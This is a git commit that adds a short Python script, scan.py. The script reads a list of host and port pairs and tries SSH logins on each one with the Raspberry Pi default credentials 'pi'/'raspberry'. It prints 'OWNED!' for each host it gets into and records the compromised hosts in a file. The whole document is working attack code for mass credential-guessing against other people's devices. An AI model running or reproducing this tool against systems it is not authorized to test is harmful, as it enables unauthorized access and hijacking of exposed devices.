eabaa5292b68de0e182e43b77c321c94e4d53b54
Fysac <Fysac@users.noreply.github.com>
2016-07-04 13:33:31 -0400

    Initial commit

---
+++ scan.py
@@ -0,0 +1,28 @@
+import paramiko
+import sys
+
+USER = 'pi'
+PASS = 'raspberry'
+CONN_TIMEOUT = 5
+
+paramiko.util.log_to_file("paramiko.log")
+
+with open('pis') as f:
+	for line in f.readlines():
+		pi = line.split(',')
+		(host, port) = (pi[0], pi[1])
+
+		ssh = paramiko.SSHClient()
+		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+		print('trying ' + host + ':' + port + '... '),
+		sys.stdout.flush()
+		try:		
+			ssh.connect(host, port=int(port), username=USER, password=PASS, timeout=CONN_TIMEOUT)
+			print('OWNED!')
+			with open('owned', 'a') as g:
+				g.write(host + ':' + port + '\n')
+			ssh.close()
+		except Exception as e:
+			print(e)
+			continue
